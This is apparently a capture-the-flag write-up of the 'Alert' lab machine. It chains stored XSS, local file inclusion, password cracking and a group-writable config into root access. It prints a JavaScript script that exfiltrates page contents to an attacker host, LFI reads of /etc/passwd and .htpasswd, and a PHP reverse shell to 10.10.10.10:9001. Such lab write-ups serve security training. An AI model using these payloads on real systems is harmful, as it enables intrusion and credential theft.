---
title: "Alert"

---

![Cap dashboard screenshot](alert.png)

Alert is an easy Linux machine featuring stored XSS, path traversal, and group writable configuration exploitation.

## Reconnaissance

I ran a standard TCP port scan:

```text
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7e:46:2c:46:6e:e6:d1:eb:2d:9d:34:25:e6:36:14:a7 (RSA)
|   256 45:7b:20:95:ec:17:c5:b4:d8:86:50:81:e0:8c:e8:b8 (ECDSA)
|_  256 cb:92:ad:6b:fc:c8:8e:5e:9f:8c:a2:69:1b:6d:d0:f7 (ED25519)
80/tcp    open     http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://alert.htb/
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Port 80 redirected to `alert.htb`, so I added it to my `/etc/hosts` file.

## Initial Access

The main page showed a Markdown file upload form and a contact form. Link-like input in the contact form triggered callbacks, indicating XSS.

Directory fuzzing found additional endpoints:

```bash
ffuf -u "http://alert.htb/index.php?page=FUZZ" \
     -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt \
     -fs 690
```

```text
about                   [Status: 200, Size: 1046, Words: 187, Lines: 24, Duration: 25ms]
contact                 [Status: 200, Size: 1000, Words: 191, Lines: 29, Duration: 927ms]
messages                [Status: 200, Size: 661, Words: 123, Lines: 25, Duration: 31ms]
donate                  [Status: 200, Size: 1116, Words: 292, Lines: 29, Duration: 42ms]
alert                   [Status: 200, Size: 966, Words: 201, Lines: 29, Duration: 41ms]
```

Direct access to `/messages.php` showed a blank page. I uploaded a test Markdown file with XSS:

```html
Hello World
<script src='http://10.10.10.10/xss.js'></script>
```
The upload triggered a callback. The share functionality created persistent stored XSS links.

I created `xss.js` to exfiltrate `/messages.php`:

```javascript
function exfil(data) {
    const e = new XMLHttpRequest();
    e.open("GET", "http://10.10.10.10/?callback=" + btoa(data));
    e.send();
}

const xhr = new XMLHttpRequest();
xhr.open("GET", "/messages.php", false);
xhr.send();
exfil(xhr.responseText);
```

Sending the XSS link via contact form exfiltrated:

```html
<h1>Messages</h1>
<ul>
<li><a href='messages.php?file=2024-03-10_15-48-34.txt'>2024-03-10_15-48-34.txt</a></li>
</ul>
```

Testing LFI with `messages.php?file=../../../../../../../../../etc/passwd` worked:

```text
root:x:0:0:root:/root:/bin/bash
--- SNIP ---
albert:x:1000:1000:albert:/home/albert:/bin/bash
david:x:1001:1002:,,,:/home/david:/bin/bash
```
Apache config revealed a protected subdomain:

```text
/etc/apache2/sites-available/000-default.conf
<VirtualHost *:80>
ServerName statistics.alert.htb
...
AuthUserFile /var/www/statistics.alert.htb/.htpasswd
Require valid-user
</VirtualHost>
```
The `.htpasswd` contained:

```text
albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
```
Cracking with hashcat:

```bash
hashcat --user -m 1600 htpasswd /usr/share/wordlists/rockyou.txt
```

```text
$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/:manchesterunited
```

SSH login worked:

```bash
ssh albert@alert.htb
```

## Privilege Escalation

Albert was in the `management` group:

```bash
find / -group management 2>/dev/null
```

```text
/opt/website-monitor/config
/opt/website-monitor/config/configuration.php
```

The `configuration.php` was group-writable:

```bash
ls -la /opt/website-monitor/config/configuration.php
-rw-rw-r-- 1 root management ... configuration.php
```

I overwrote it with a reverse shell:

```php
<?php
define('PATH', '/opt/website-monitor');
$sock=fsockopen("10.10.10.10",9001);system("sh <&3 >&3 2>&3");
?>
```

The web process loaded the config as root, triggering a callback and completing the machine.

## Attack Path

- **Port scan** — identify SSH and HTTP redirect to `alert.htb`.
- **XSS discovery** — contact form accepts links and triggers callbacks.
- **Directory enum** — find `/messages.php` endpoint via fuzzing.
- **Stored XSS** — upload Markdown with external script reference.
- **LFI via XSS** — exfiltrate `/messages.php?file=` responses.
- **User enum** — extract `albert` and `david` from `/etc/passwd`.
- **Subdomain discovery** — find `statistics.alert.htb` in Apache config.
- **Credential extraction** — read and crack `.htpasswd` via LFI.
- **SSH access** — login as `albert:manchesterunited`.
- **Group enum** — find management group writable `configuration.php`.
- **Root shell** — inject PHP reverse shell into web config.
